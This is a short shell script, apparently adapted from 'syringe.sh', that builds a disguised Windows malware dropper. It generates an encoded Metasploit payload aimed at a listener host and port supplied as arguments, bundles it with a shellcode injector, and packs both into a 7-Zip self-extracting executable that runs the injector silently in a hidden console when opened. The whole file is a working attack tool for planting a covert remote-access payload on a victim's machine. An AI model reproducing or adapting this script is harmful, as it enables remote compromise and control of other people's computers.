#based on syringe.sh

echo " Genrating payload.........."
payload=$(msfpayload $1 EXITFUNC=thread LHOST=$2 LPORT=$3 R | msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX)

echo " Creating EXE..."
tar -xvf cmd/quick/syfiles.tar>/dev/null
echo "syringe.exe -3 $payload" > s.bat
echo ";!@Install@!UTF-8!" > config.txt
echo "GUIMode=\"2\"" >> config.txt
echo "RunProgram=\"hidcon:s.bat\"" >> config.txt
echo ";!@InstallEnd@!" >> config.txt
7z a files.7z s.bat syringe.exe>/dev/null
cat 7zsd.sfx config.txt files.7z> $4.exe
mv $4.exe $5
rm config.txt s.bat files.7z 7zsd.sfx syringe.exe

